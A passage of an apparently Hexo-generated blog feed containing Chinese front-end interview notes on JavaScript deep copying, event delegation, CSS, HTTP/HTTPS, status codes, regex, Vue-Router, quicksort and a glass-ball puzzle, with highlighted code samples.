document.write(index, elem);</span><br><span class="line">&#125;</span><br><span class="line"><span class="regexp">//</span> <span class="number">0</span> <span class="string">&quot;a&quot;</span></span><br><span class="line"><span class="regexp">//</span> <span class="number">1</span> <span class="string">&quot;b&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="10-说明下数据对象深拷贝的实现方式？"><a href="#10-说明下数据对象深拷贝的实现方式？" class="headerlink" title="10. 说明下数据对象深拷贝的实现方式？"></a>10. 说明下数据对象深拷贝的实现方式？</h5><ul><li>浅拷贝<br>首先可以通过 Object.assign 来解决这个问题。<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let <span class="selector-tag">a</span> = &#123;</span><br><span class="line">    age: <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">let <span class="selector-tag">b</span> = Object<span class="selector-class">.assign</span>(&#123;&#125;, a)</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.age</span> = <span class="number">2</span></span><br><span class="line">console<span class="selector-class">.log</span>(<span class="selector-tag">b</span>.age) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>当然我们也可以通过展开运算符（…）来解决<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let <span class="selector-tag">a</span> = &#123;</span><br><span class="line">    age: <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">let <span class="selector-tag">b</span> = &#123;...a&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.age</span> = <span class="number">2</span></span><br><span class="line">console<span class="selector-class">.log</span>(<span class="selector-tag">b</span>.age) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>通常浅拷贝就能解决大部分问题了，但是当我们遇到如下情况就需要使用到深拷贝了<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let <span class="selector-tag">a</span> = &#123;</span><br><span class="line">    age: <span class="number">1</span>,</span><br><span class="line">    jobs: &#123;</span><br><span class="line">        first: <span class="string">&#x27;FE&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let <span class="selector-tag">b</span> = &#123;...a&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.jobs</span><span class="selector-class">.first</span> = <span class="string">&#x27;native&#x27;</span></span><br><span class="line">console<span class="selector-class">.log</span>(<span class="selector-tag">b</span><span class="selector-class">.jobs</span>.first) <span class="comment">// native</span></span><br></pre></td></tr></table></figure>浅拷贝只解决了第一层的问题，如果接下去的值中还有对象的话，那么就又回到刚开始的话题了，两者享有相同的引用。要解决这个问题，我们需要引入深拷贝。</li><li>深拷贝<br>这个问题通常可以通过 <code>JSON.parse(JSON.stringify(object))</code> 来解决。<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let <span class="selector-tag">a</span> = &#123;</span><br><span class="line">    age: <span class="number">1</span>,</span><br><span class="line">    jobs: &#123;</span><br><span class="line">        first: <span class="string">&#x27;FE&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let <span class="selector-tag">b</span> = JSON<span class="selector-class">.parse</span>(JSON<span class="selector-class">.stringify</span>(a))</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.jobs</span><span class="selector-class">.first</span> = <span class="string">&#x27;native&#x27;</span></span><br><span class="line">console<span class="selector-class">.log</span>(<span class="selector-tag">b</span><span class="selector-class">.jobs</span>.first) <span class="comment">// FE</span></span><br></pre></td></tr></table></figure>但是该方法也是有局限性的：</li></ul><p>1.会忽略 <code>undefined</code><br>2.不能序列化函数<br>3.不能解决循环引用的对象</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">let obj = &#123;</span><br><span class="line">  <span class="selector-tag">a</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="selector-tag">b</span>: &#123;</span><br><span class="line">    c: <span class="number">2</span>,</span><br><span class="line">    d: <span class="number">3</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line">obj<span class="selector-class">.c</span> = obj<span class="selector-class">.b</span></span><br><span class="line">obj<span class="selector-class">.e</span> = obj<span class="selector-class">.a</span></span><br><span class="line">obj<span class="selector-class">.b</span><span class="selector-class">.c</span> = obj<span class="selector-class">.c</span></span><br><span class="line">obj<span class="selector-class">.b</span><span class="selector-class">.d</span> = obj<span class="selector-class">.b</span></span><br><span class="line">obj<span class="selector-class">.b</span><span class="selector-class">.e</span> = obj<span class="selector-class">.b</span><span class="selector-class">.c</span></span><br><span class="line">let newObj = JSON<span class="selector-class">.parse</span>(JSON<span class="selector-class">.stringify</span>(obj))</span><br><span class="line">console<span class="selector-class">.log</span>(newObj)</span><br></pre></td></tr></table></figure><p>如果你有这么一个循环引用对象，你会发现你不能通过该方法深拷贝</p><p><img src="/Blog/2019/03/29/interview/%E4%BB%8A%E6%97%A5%E4%BB%BD%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/index/img_5.png"></p><p>在遇到函数或者<code>undefined</code>的时候，该对象也不能正常的序列化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">    <span class="attr">age</span>: <span class="literal">undefined</span>,</span><br><span class="line">    <span class="attr">jobs</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;cool&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(a))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b) <span class="comment">// &#123;name: &quot;cool&quot;&#125;</span></span><br></pre></td></tr></table></figure><p>你会发现在上述情况中，该方法会忽略掉函数和 <code>undefined</code> 。</p><p>但是在通常情况下，复杂数据都是可以序列化的，所以这个函数可以解决大部分问题，并且该函数是内置函数中处理深拷贝性能最快的。当然如果你的数据中含有以上三种情况下，可以使用 <a href="https://lodash.com/docs##cloneDeep">lodash 的深拷贝函数</a>。</p><p>如果你所需拷贝的对象含有内置类型并且不包含函数，可以使用 <code>MessageChannel</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">structuralClone</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;port1, port2&#125; = <span class="keyword">new</span> <span class="title class_">MessageChannel</span>();</span><br><span class="line">    port2.<span class="property">onmessage</span> = <span class="function"><span class="params">ev</span> =&gt;</span> <span class="title function_">resolve</span>(ev.<span class="property">data</span>);</span><br><span class="line">    port1.<span class="title function_">postMessage</span>(obj);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: &#123;</span><br><span class="line">    <span class="attr">c</span>: b</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="comment">// 注意该方法是异步的</span></span><br><span class="line"><span class="comment">// 可以处理 undefined 和循环引用对象</span></span><br><span class="line"><span class="keyword">const</span> clone = <span class="keyword">await</span> <span class="title function_">structuralClone</span>(obj);</span><br></pre></td></tr></table></figure><h5 id="11-说明下事件代理-事件委托-事件冒泡"><a href="#11-说明下事件代理-事件委托-事件冒泡" class="headerlink" title="11.说明下事件代理 事件委托 事件冒泡"></a>11.说明下事件代理 事件委托 事件冒泡</h5><ul><li><strong>事件冒泡</strong>：子级元素的某个事件被触发，它的上级元素的该事件也被递归触发。</li><li><strong>事件代理（事件委托）</strong>：使用了事件冒泡的原理，从触发某事件的元素开始，递归地向上级元素传播事件。</li></ul><p>事件委托的优点:<br>1.对于要大量处理的元素，不必为每个元素都绑定事件，只需要在它们的父元素上绑定一次即可，提高性能。<br>2.可以处理动态插入DOM中的元素，对动态插入DOM中的元素进行直接绑定是不行的。</p>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>今日面试题汇总</title>
      <link href="/Blog/2019/03/29/interview/%E4%BB%8A%E6%97%A5%E9%9D%A2%E8%AF%95%E9%A2%98%E6%B1%87%E6%80%BB/index/"/>
      <url>/Blog/2019/03/29/interview/%E4%BB%8A%E6%97%A5%E9%9D%A2%E8%AF%95%E9%A2%98%E6%B1%87%E6%80%BB/index/</url>
      
        <content type="html"><![CDATA[<h2 id="Q-CSS-有哪些样式可以给子元素继承"><a href="#Q-CSS-有哪些样式可以给子元素继承" class="headerlink" title="Q: CSS 有哪些样式可以给子元素继承!"></a>Q: CSS 有哪些样式可以给子元素继承!</h2><ul><li>可继承的:font-size,font-weight,line-height,color,cursor等</li><li>不可继承的一般是会改变盒子模型的:display,margin、border、padding、height等</li></ul><p>更加全面的可以到引擎找</p><h2 id="Q-CSS-中transition和animate有何区别-animate-如何停留在最后一帧"><a href="#Q-CSS-中transition和animate有何区别-animate-如何停留在最后一帧" class="headerlink" title="Q: CSS 中transition和animate有何区别? animate 如何停留在最后一帧!"></a>Q: CSS 中transition和animate有何区别? animate 如何停留在最后一帧!</h2><ul><li>transition一般用来做过渡的, 没时间轴的概念, 通过事件触发(一次),没中间状态(只有开始和结束)</li><li>而animate则是做动效,有时间轴的概念(帧可控),可以重复触发和有中间状态;</li><li>过渡的开销比动效小,前者一般用于交互居多,后者用于活动页居多;</li><li>至于如何让animate停留在最后一帧也好办,就它自身参数的一个值就可以了<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">animation-fill-mode</span>: forwards;  </span><br><span class="line">&lt;!<span class="attr">--backwards</span>则停留在首帧,both是轮流--&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Q-求-1-10-11-1-’-5’-12-13-14-15-2-3-4-7-8-9-内最大值与最小值之差"><a href="#Q-求-1-10-11-1-’-5’-12-13-14-15-2-3-4-7-8-9-内最大值与最小值之差" class="headerlink" title="Q: 求[1, 10, 11, -1,’-5’,12, 13, 14, 15, 2, 3, 4, 7, 8, 9]内最大值与最小值之差"></a>Q: 求[1, 10, 11, -1,’-5’,12, 13, 14, 15, 2, 3, 4, 7, 8, 9]内最大值与最小值之差</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 来一个很粗糙的版本,只当传入是数组且可以隐性转为数字的</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">MaxMinPlus</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="comment">// 返回最大值与最小值之差</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">isArray</span>(arr) ? <span class="title class_">Math</span>.<span class="property">max</span>.<span class="title function_">apply</span>(<span class="title class_">Math</span>, arr) - <span class="title class_">Math</span>.<span class="property">min</span>.<span class="title function_">apply</span>(<span class="title class_">Math</span>, arr) : <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;传入的不是数组亦或者未能解决的错误&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果是 20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 若是要完善的话,要考虑传入的是非数组,</span></span><br><span class="line"><span class="comment">//传入字符串的时候要判断,然后切割为数组..</span></span><br><span class="line"><span class="comment">// 都要考虑进去代码量不短</span></span><br></pre></td></tr></table></figure><h2 id="Q-请给Array实现一个方法-去重后返回重复的字符-新数组-‘’"><a href="#Q-请给Array实现一个方法-去重后返回重复的字符-新数组-‘’" class="headerlink" title="Q: 请给Array实现一个方法,去重后返回重复的字符(新数组)‘’"></a>Q: 请给Array实现一个方法,去重后返回重复的字符(新数组)‘’</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">var</span> testArr = [<span class="number">1</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>];</span><br><span class="line">    </span><br><span class="line">  <span class="built_in">Array</span>.prototype.extraChar = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="keyword">var</span> cacheExtraChar = []; <span class="comment">// 缓存重复出现的字符</span></span><br><span class="line">      <span class="keyword">var</span> that = this; <span class="comment">// 缓存 this;</span></span><br><span class="line">      this.<span class="built_in">map</span>(<span class="keyword">function</span>(<span class="params">item,index</span>)&#123;</span><br><span class="line">          <span class="comment">// 怎么理解这段代码呢?</span></span><br><span class="line">          <span class="comment">// 就是向前往后查找一遍和从后往前查找一遍,不等就是重复</span></span><br><span class="line">          <span class="comment">// 为什么还要判断一遍缓存,是过滤缓存数组内多次写入</span></span><br><span class="line">          (that.<span class="built_in">indexOf</span>(item) !== that.lastIndexOf(item)) &amp;&amp; cacheExtraChar.<span class="built_in">indexOf</span>(item) === <span class="number">-1</span> ? cacheExtraChar.<span class="built_in">push</span>(item) : <span class="number">-1</span>;</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">return</span> cacheExtraChar;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">testArr.extraChar(); <span class="comment">// [1, 3, 7, 2, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 若是还需要排序就再排序下</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>]</span><br><span class="line">.extraChar()</span><br><span class="line">.<span class="built_in">sort</span>(<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;<span class="keyword">return</span> a-b&#125;) <span class="comment">// [1, 2, 3, 4, 7]</span></span><br></pre></td></tr></table></figure><h2 id="Q-谈谈你对-TCP-的理解"><a href="#Q-谈谈你对-TCP-的理解" class="headerlink" title="Q: 谈谈你对 TCP 的理解;"></a>Q: 谈谈你对 TCP 的理解;</h2><p><a href="https://www.jianshu.com/p/a731a467e42e">文章连接</a></p><h2 id="Q-HTTP-和-HTTPS-有何差异-听说过-SPDY-么"><a href="#Q-HTTP-和-HTTPS-有何差异-听说过-SPDY-么" class="headerlink" title="Q: HTTP 和 HTTPS 有何差异? 听说过 SPDY 么?"></a>Q: HTTP 和 HTTPS 有何差异? 听说过 SPDY 么?</h2><p>我只是粗浅的回答了下…</p><p><code>HTTP</code>相对于 <code>HTTPS</code>来说,速度较快且开销较小(没有 SSL&#x2F;TSL) 对接,默认是80端口;</p><p><code>HTTP</code>容易遭受域名劫持,而<code>HTTPS</code>相对来说就较为安全但开销较大(数据以加密的形式传递),默认端口为443..</p><p><code>HTTP</code>是明文跑在 <code>TCP</code> 上.而<code>HTTPS</code>跑在<code>SSL/TLS</code>应用层之下,<code>TCP</code>上的</p><p>Q: 那么 <code>HTTPS</code>中的<code>TLS/SSL</code>是如何保护数据的…</p><p>一般有两种形式,非对称加密,生成公钥和私钥,私钥丢服务器,公钥每次请求去比对验证;</p><p>更严谨的采用 CA(Certificate Authority),给密钥签名….</p><p>Q: 你说到对称加密和非对称加密,能说说整个流程如何运转的么(HTTPS)</p><ul><li>对称加密:<ul><li>双方都有同样的密钥,每次通讯都要生成一个唯一密钥,速度很快</li><li>安全性较低且密钥增长的数量极快</li></ul></li><li>非对称加密(一般用 RSA)<ul><li>安全性很高,对资源消耗很大(CPU),目前主流的加密算法(基本用于交换密钥或签名,而非所有通讯内容)</li></ul></li><li>CA(数字签名):<ul><li>这个是为了防止中间人给偷换了造成数据被窃取而诞生的</li><li>用一些权威机构颁布的算法来签名,权威机构做中间人,通讯过程都会跟机构核对一遍</li></ul></li></ul><blockquote><p>懂得真心不多,回来找了下相关资料,有兴趣可以点击看看;</p></blockquote><ul><li><a href="https://zhuanlan.zhihu.com/p/22142170">深入揭秘HTTPS安全问题&amp;连接建立全过程</a></li><li><a href="https://klionsec.github.io/2017/07/31/https-learn/">深入理解 https 通信加密过程:口语化</a> “ : 看了上面那篇文章来看下面,会清晰很多</li></ul><p>Q: <code>SPDY</code> 听说过么.什么来的?</p><p>谷歌推行一种协议(<code>HTTP</code> 之下SSL之上[TCP]),可以算是HTTP2的前身,有这么些优点</p><ul><li>压缩数据(HEADER)</li><li>多路复用</li><li>优先级(可以给请求设置优先级)</li></ul><p>而这些优点基本 HTTP2也继承下来了..</p><p>Q: 你对 HTTP 的状态吗了解多少…</p><p>这里列举一丢丢常见的..</p><ul><li>1XX: 一般用来判断协议更换或者确认服务端收到请求这些<ul><li>100: 服务端收到部分请求,若是没有拒绝的情况下可以继续传递后续内容</li><li>101: 客户端请求变换协议,服务端收到确认</li></ul></li><li>2xx: 请求成功,是否创建链接,请求是否接受,是否有内容这些<ul><li>200: (成功)服务器已成功处理了请求。</li><li>201: (已创建)请求成功并且服务器创建了新的资源。</li><li>202: (已接受)服务器已接受请求，但尚未处理。</li><li>204: (无内容)服务器成功处理了请求，但没有返回任何内容。</li></ul></li><li>3XX: 一般用来判断重定向和缓存<ul><li>301: 所有请求已经转移到新的 url(永久重定向),会被缓存</li><li>302: 临时重定向,不会被缓存</li><li>304: 本地资源暂未改动,优先使用本地的(根据<code>If-Modified-Since or If-Match</code>去比对服务器的资源,缓存)</li></ul></li><li>4XX: 一般用来确认授权信息,请求是否出错,页面是否丢失<ul><li>400: 请求出错</li><li>401: 未授权,不能读取某些资源</li><li>403: 阻止访问,一般也是权限问题</li><li>404: 页面丢失,资源没找到</li><li>408: 请求超时</li><li>415: 媒介类型不被支持，服务器不会接受请求。</li></ul></li><li>5XX: 基本都是服务端的错误<ul><li>500: 服务端错误</li><li>502: 网关错误</li><li>504: 网关超时</li></ul></li></ul><hr><p>Q: HTTP的请求报文是怎么样的,能大体的说下么?</p><p>HTTP 的请求报文 &#x3D; 请求行 + 请求头 + 请求体;</p><ul><li>请求行: 这个好理解就是访问的方法+ 协议+ 访问的 URL 构成</li><li>请求头: 这个也好理解,比如 <code>accept</code>,<code>content-type</code>,<code>user-agent</code>这类值键对,服务端可以直接读取的</li><li>请求体: 比如 POST 提交的一个表单,我们编码后放在上面需要传递的</li></ul><p>想深入了解的具体引擎搜索</p><p>Q: 请求报文知道,那你说说<code>cookie</code>是如何跟随请求的?</p><p>Cookie 就是保存在 HTTP 协议的请求或者应答头部(Cookie 是由服务端生成),这样一路漂泊…</p><p>Q: Cookie 隔离是什么,如何做;</p><blockquote><p>cookie 隔离就是降低 <code>header</code> 的数据包含,以达到加快访问速度的目的</p></blockquote><p>方案: 静态资源丢 CDN或者非主域来加载</p><h2 id="Q-浏览器缓存和服务端的缓存控制你了解多少-说说看"><a href="#Q-浏览器缓存和服务端的缓存控制你了解多少-说说看" class="headerlink" title="Q: 浏览器缓存和服务端的缓存控制你了解多少,说说看?"></a>Q: 浏览器缓存和服务端的缓存控制你了解多少,说说看?</h2><p><a href="https://www.jianshu.com/p/603a785a8413">文章链接</a></p><h2 id="Q-有字符串-var-test-x3D-’abc345efgabcab’-请根据提示实现对应要求"><a href="#Q-有字符串-var-test-x3D-’abc345efgabcab’-请根据提示实现对应要求" class="headerlink" title="Q:有字符串 var test&#x3D;’abc345efgabcab’; 请根据提示实现对应要求"></a>Q:有字符串 var test&#x3D;’abc345efgabcab’; 请根据提示实现对应要求</h2><ul><li>去掉字符串中的 a,b,c 字符 ,形成结果’345efg’;<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.replace(<span class="regexp">/[abc]/g</span>,<span class="string">&#x27;&#x27;</span>); <span class="regexp">//</span> <span class="string">&quot;345efg&quot;</span></span><br></pre></td></tr></table></figure></li><li>将字符串的数字用括号括起来, 形成结果: abc[3][4][5]efg….’<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test.replace(<span class="regexp">/\d/g</span>,<span class="string">&#x27;[$&amp;]&#x27;</span>);  <span class="regexp">//</span> <span class="string">&quot;abc[3][4][5]efgabcab&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 若是有分组则按照<span class="variable">$1</span>, <span class="variable">$2</span>, <span class="variable">$3</span>的形式进行引用，而 $&amp; 则表示的是整个正则表达式匹配的内容。</span><br></pre></td></tr></table></figure></li><li>将字符串中的每个数字的值分别乘以2,输出:’abc6810….’<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> temp = test.<span class="built_in">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="built_in">map</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="regexp">/^\d$/</span>.test(item) ? item * <span class="number">2</span> : item;</span><br><span class="line">&#125;).join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// &quot;abc6810efgabcab&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="Q-Vue-Router的两种模式主要依赖什么实现的"><a href="#Q-Vue-Router的两种模式主要依赖什么实现的" class="headerlink" title="Q: Vue-Router的两种模式主要依赖什么实现的"></a>Q: Vue-Router的两种模式主要依赖什么实现的</h2><ul><li>hash主要依赖location.hash来改动 URL,达到不刷新跳转的效果.每次 hash 改变都会触发hashchange事件(来响应路由的变化,比如页面的更换)</li><li>history主要利用了 HTML5的 historyAPI 来实现,用pushState和replaceState来操作浏览历史记录栈</li></ul><h2 id="Q-MVVM-和-MVC-的差异-听说过-MVP"><a href="#Q-MVVM-和-MVC-的差异-听说过-MVP" class="headerlink" title="Q: MVVM 和 MVC 的差异? 听说过 MVP?"></a>Q: MVVM 和 MVC 的差异? 听说过 MVP?</h2><p>这类的文章好多,三个开发模式的诞生都有前后,不是同时出现的.</p><p>传送门:</p><ul><li><a href="http://www.ruanyifeng.com/blog/2015/02/mvcmvp_mvvm.html">MVC，MVP 和 MVVM 的图示</a></li><li><a href="https://juejin.im/post/593021272f301e0058273468">浅析前端开发中的 MVC&#x2F;MVP&#x2F;MVVM 模式</a></li></ul><h2 id="Q-你对基础算法这块掌握的如何…"><a href="#Q-你对基础算法这块掌握的如何…" class="headerlink" title="Q: 你对基础算法这块掌握的如何…."></a>Q: 你对基础算法这块掌握的如何….</h2><blockquote><p>来,这纸给你,写个快排试试…</p></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 快排的大体思路是这样的,</span></span><br><span class="line"><span class="comment">// 找个中位值,从原数组切割出来,</span></span><br><span class="line"><span class="comment">// 剩下的作为两个数组,每次都去比较;</span></span><br><span class="line"><span class="comment">// 直到递归的结果出来, 平均复杂度O(nlog n)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">quickSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="comment">//如果数组长度&lt;=1,则直接返回</span></span><br><span class="line">  <span class="keyword">if</span> (arr.<span class="built_in">length</span> &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 中间位(基准)取长度的一半向下取整</span></span><br><span class="line">  <span class="keyword">var</span> pivotIndex = Math.<span class="built_in">floor</span>(arr.<span class="built_in">length</span> / <span class="number">2</span>);</span><br><span class="line">  <span class="comment">//把中间位从原数组切割出来, splice 会改变原数组!!!!</span></span><br><span class="line">  <span class="keyword">var</span> pivot = arr.<span class="built_in">splice</span>(pivotIndex, <span class="number">1</span>)[<span class="number">0</span>];</span><br><span class="line">  <span class="comment">//定义两个空数组来存放比对后的值</span></span><br><span class="line">  <span class="keyword">var</span> <span class="built_in">left</span> = [];</span><br><span class="line">  <span class="keyword">var</span> <span class="built_in">right</span> = [];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//比基准小的放在left，比基准大的放在right</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span> , j = arr.<span class="built_in">length</span>; i &lt; j; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] &lt;= pivot) &#123;</span><br><span class="line">      <span class="built_in">left</span>.<span class="built_in">push</span>(arr[i]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">right</span>.<span class="built_in">push</span>(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//递归下去  arr = [ left , pivot , right]</span></span><br><span class="line">  <span class="comment">// 怎么个递归法,就是比对后的数组还是会重复之前的取基准再切开比较..直到最后没有可以切了</span></span><br><span class="line">  <span class="keyword">return</span> quickSort(<span class="built_in">left</span>).concat([pivot], quickSort(<span class="built_in">right</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Q-思维拓展题-你有两个玻璃球-有个100米的高楼-求玻璃球在哪个楼层扔下会碎-用的次数最少"><a href="#Q-思维拓展题-你有两个玻璃球-有个100米的高楼-求玻璃球在哪个楼层扔下会碎-用的次数最少" class="headerlink" title="Q: 思维拓展题: 你有两个玻璃球,有个100米的高楼,求玻璃球在哪个楼层扔下会碎(用的次数最少);"></a>Q: 思维拓展题: 你有两个玻璃球,有个100米的高楼,求玻璃球在哪个楼层扔下会碎(用的次数最少);</h2><p>问题的要点: 玻璃球碎(有限个数) ,确定楼层数 , 最少次数 &#x3D;&gt; 就是求最优的公式</p><p>在这道题上给秀的一脸,我的第一次的思路</p><blockquote><p>先折半,就变成[1-50][51-100], 那就是 1+50 &#x3D; 51次 …</p></blockquote><p>面试大佬说,你用了快排的思路就肯定不是最优的..</p><blockquote><p>憋了许久,想到开平方 <img src="/Blog/2019/03/29/interview/%E4%BB%8A%E6%97%A5%E9%9D%A2%E8%AF%95%E9%A2%98%E6%B1%87%E6%80%BB/index/img.png"></p><p> , 